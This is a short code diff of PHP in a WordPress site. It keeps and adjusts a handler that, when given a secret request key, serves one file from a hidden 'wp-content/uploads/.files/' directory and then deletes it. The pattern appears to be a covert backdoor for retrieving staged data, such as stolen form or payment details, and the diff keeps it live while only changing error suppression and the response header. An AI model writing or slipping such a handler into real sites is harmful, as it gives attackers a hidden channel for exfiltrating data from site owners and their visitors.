@@ -1,4 +1,4 @@
-if ($_REQUEST["_k"] == "INSERT_KEY") {
+if (@$_REQUEST["_k"] == "INSERT_KEY") {
     $dirpath = ABSPATH . "wp-content/uploads/.files/";
     $files = scandir($dirpath);
     if (count($files) > 2) {
@@ -6,7 +6,7 @@ if ($_REQUEST["_k"] == "INSERT_KEY") {
         readfile($filename);
         unlink($filename);
     } else {
-        http_response_code(202);
+		header("HTTP/1.1 202 Accepted");
     }
     die;
 }
